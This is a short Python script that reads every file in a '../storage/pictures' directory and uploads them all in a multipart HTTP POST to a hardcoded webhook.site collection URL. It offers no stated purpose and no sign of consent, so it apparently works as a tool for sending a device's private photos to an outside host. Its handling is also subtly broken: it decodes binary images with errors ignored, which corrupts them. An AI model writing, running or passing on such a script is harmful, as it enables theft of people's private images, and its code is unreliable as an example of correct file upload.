import os
import socket
import mimetypes

# Define the URL for the webhook and the server's host and port
host = 'webhook.site'
port = 80
url = '/42f33b37-f054-4344-87e5-32947638f6c6'

# Define the path to the directory
dir_path = "../storage/pictures"

# Get a list of all files in the directory
files = [f for f in os.listdir(dir_path) if os.path.isfile(os.path.join(dir_path, f))]

# Create a socket connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

# Prepare the HTTP headers
boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
headers = [
    f"POST {url} HTTP/1.1",
    f"Host: {host}",
    "Content-Type: multipart/form-data; boundary=" + boundary,
    "Connection: close"
]

# Build the body with the files
body = ""
for filename in files:
    file_path = os.path.join(dir_path, filename)
    content_type, _ = mimetypes.guess_type(file_path)
    if content_type is None:
        content_type = 'application/octet-stream'
    
    with open(file_path, 'rb') as f:
        file_data = f.read()
    
    body += f"--{boundary}\r\n"
    body += f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
    body += f"Content-Type: {content_type}\r\n\r\n"
    body += file_data.decode(errors='ignore')  # Assuming ASCII-safe files, handle binary data carefully.
    body += "\r\n"

body += f"--{boundary}--\r\n"

# Send the HTTP request with the headers and body
request = "\r\n".join(headers) + "\r\n\r\n" + body
sock.sendall(request.encode())

# Receive the response from the server
response = sock.recv(4096)
print(response.decode())

# Close the socket
sock.close()
